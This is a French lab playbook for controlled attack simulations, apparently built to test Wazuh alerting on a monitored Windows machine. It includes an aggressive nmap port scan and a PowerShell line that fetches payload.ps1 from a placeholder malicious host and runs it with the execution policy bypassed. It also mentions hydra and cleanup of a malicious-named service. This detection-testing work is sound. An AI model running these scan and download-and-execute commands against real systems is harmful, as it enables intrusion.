🎯 Playbooks d'Attaques Contrôlées & Matrice de Détection

1. Contexte

Ce document décrit les scénarios d'attaque exécutés depuis une machine Linux contre le poste Windows supervisé par Wazuh. Chaque playbook comprend la commande, les indicateurs attendus et la règle de détection Wazuh correspondante.

2. Playbooks d'attaques

🔎 2.1 Scan Nmap agressif

# Sur la machine d'attaque (Linux/WSL2)
nmap -sS -p- -T4 100.65.111.9 -oA /tmp/nmap_aggressive

📜 2.4 PowerShell suspect (T1059.001)

# Sur le poste Windows
Invoke-WebRequest -Uri "http://malicious.example.com/payload.ps1" `
    -OutFile "$env:TEMP\payload.ps1"
powershell -ExecutionPolicy Bypass -File "$env:TEMP\payload.ps1"

4. Guide d'exécution (pas à pas)

  1. Pré-requis : machine Linux avec nmap, hydra, curl installés.
  2. IP cible : 100.65.111.9 (Manager) ou IP du poste Windows.
  3. Exécuter chaque playbook dans l'ordre. Après chaque exécution, attendre 30 secondes.
  4. Vérifier dans le Dashboard Wazuh → Security Events → filtre sur l'agent cible.
  5. Capture d'écran de chaque alerte (niveau + Rule ID).
  6. Nettoyage : sc delete EvilSvc, suppression des fichiers payload, etc.
